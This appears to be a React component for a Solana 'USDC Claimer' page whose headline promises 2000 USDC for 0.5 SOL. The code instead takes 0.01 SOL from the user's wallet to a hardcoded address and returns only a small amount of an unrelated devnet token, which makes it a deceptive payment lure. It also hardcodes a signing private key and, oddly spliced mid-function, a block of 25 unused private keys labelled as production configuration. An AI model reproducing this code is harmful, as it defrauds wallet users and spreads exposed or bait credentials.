/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "348Deg4MW2hbBCBXeTaVqoAATiJk9cVLcSKeJda4HuW5dFee5awUMULVNuwx9MxJjNLmG1biGt3hNDBSnaxprgEv"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5mZX14XhCzibuBjijcBbqT8j9znhabb3pFLv9UY5gPCCCATBzSFRW4LVFiiFbUAALfmEXFunWvUvVDw7B7222HhJ",
  "key1": "5QAVu6nW7MjeapzFbw9qrvEvTWLDZzzTfJU4bJaMXT9zoRKt1XKKP9tH1ZZmndZfUXKeEK62pJM7ECNm3HnZkZUi",
  "key2": "56w7mSxK3M1eLwZLbMcnELpGFLskdXxZhEd6a1BZYXADvq4dXymtaxK2JNkY3NsYXgcvr7h5Qgvui4tM6xBKQp8F",
  "key3": "9sxeQf2qPgtSznwhK5ezhFsmCKuLBHz5cVfgD5SFumpqyr2WLMTwD78Vw1hsYxyrKyjJWeqCvk2g4oYPDMY3cWK",
  "key4": "rLNMMRZhsFoq3WreVugE1biBwV1a4e4Nxn8nPTQq6cque5ZPZuXQ9zxhSskbv86R6E8H11bBzLpdY2P7VjJmZw6",
  "key5": "2R27DPNja1cS8BtAaqfgjozUXpFKYYeTVJiZJ7EzVzhWCRv7GEEgG3TVVpVXjbAdz53c584SwMR4Tgabsn2r9Sq1",
  "key6": "4Vgx9m4Y3pMvbo3dPnnRiD7YjBtUZkg9P9MV9k7pXrodg8uzADvxREqVpuFCcMgLxqCrm4qAmFq2oSgRhHSW6idC",
  "key7": "49hMtPRgR5JD2GX5Bkt65bgkpUStp35EMcdPSwhiAUVwr99jpG2N9nfLEgSuVAdcdFUMByZGewPWi91az3DL47vR",
  "key8": "5LF6rcwnWwKAiMHW7prbXGwycd9QfKpawKYYnkCcM7RUfTK6CQrdzDUzkW8iybbWpECKk9o99JkHrMztnBZpQz5H",
  "key9": "5sDRVgNrgneyE2u3Gw6zvPPH8Ku9bhKPAnfqZ5PATrBQEoyJEkSAsaSKwGeo725m9yXRm59BHFwGJGcj726Xg8pP",
  "key10": "3R4uMp8wDJZzqbqn2oPS3pCuV1GWVz5ch2HPymLmQxRVTHpufkvYHd4kQMuKT379jxX1sjYFuemVojqzeGVRLsVe",
  "key11": "5aDZkvLK31EGp95cxSqJy4AvXEGNQRTw9ADSesrBSuCLsqZYHUGnBHDTzraq5jf34CJYnZvbAvnZUn2GER2tj8K3",
  "key12": "5xFqkuSU4Q35o7NCiG8nrLthHJDE7FJrfgVYRZhFa5gmPP2mCVmr6AZBjXREHrKkurg2nMXrBbvVmck1yE4hDKd9",
  "key13": "Z8GLKVQa2CgMLujUV9skLR8objVuo1YmXMYwBxiVpHvjTxLnmtrD8yrmywXPQ4qDEcKnxJuW414VcZQ1GfL4RMe",
  "key14": "4Gf1uMjHpvQYqb78g9XNbXwXThHecTDKngqhhaFy8ekdcQ8TjWU5Np5cWdkKn5hffg4pabmdwWsQS4A3uJxjPynr",
  "key15": "3kZSiVV3S8um1xbsLZE4kuFbDuQnSEyAVeWJXWyz4XCUAqhvZmxpkkcjnYrQhpNxZRtvzpHxSD8Vd6vgsnbWnt6s",
  "key16": "5nqdic4Cfmogz4akqc3j6ivs2C9PrG1dk783pakMXK1zvUbkY9xJXm4u4a4X44z1kg9fPMEtAuT67qv9TkLMM7Pd",
  "key17": "3hZrdJVyKShQbgpgkXsAY5Hgo6Vht1JNwVQU5yUR28uNMWkFx4yu4sBsUMZQE7ARzrtvae1xfgfh5Hn9CKmoCsER",
  "key18": "XiufTBe4GDKKmVFns5V7wixFAeSEFaL39Nh8EXN99DEEGfhXUQLXXv59qnHZ17JNo5MkR6aKUihaLBonTi6FdRp",
  "key19": "2vTrZpqpz7sgKqmn6zfNEc78DjyBkARgeDWQXGPRv8HadkUahEgirT4powgcvJLEP6a7Cvm5hqMiQNimzZXcz8PT",
  "key20": "5cq6MAQtynj5WxMTkPrdB88EGzdNjDzK7AvGesUQvZeZgJYmhZGTstdCxYsDrozsRDiqY9QQyoxCzpH65wm69VAL",
  "key21": "CSmeCpwQPLjoYtJ4S6MvSNTZ98dUD6qN3si49N37b63hKnEWynswGT2vxmGyG6PvMQRSa5AJFr5hb3kQxW6n4PN",
  "key22": "YguwwfvhWkk4iepmnwzyxF2YXNJywyfJbcSvcxaa8YzCoi8YUj2BJhXR9PJTw3QQDSnK14ctv76XeLFviu3AT8Q",
  "key23": "3ByZS3wq8iBDXybTabXcNnFRyLuLaoYLKUtJVk6nrsdvCyoAhAy6XsoAHznrZWnwJMQffLFnSRG1E22P7vysmdCf",
  "key24": "39h1qUXP49rabriwqQj8JZU1CSwfDjss1Kruhqad3uEv1BJ4FZJLaBd7P3Pf3sJ7U2KzaojW9vZsJrapKMu9WxD4"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
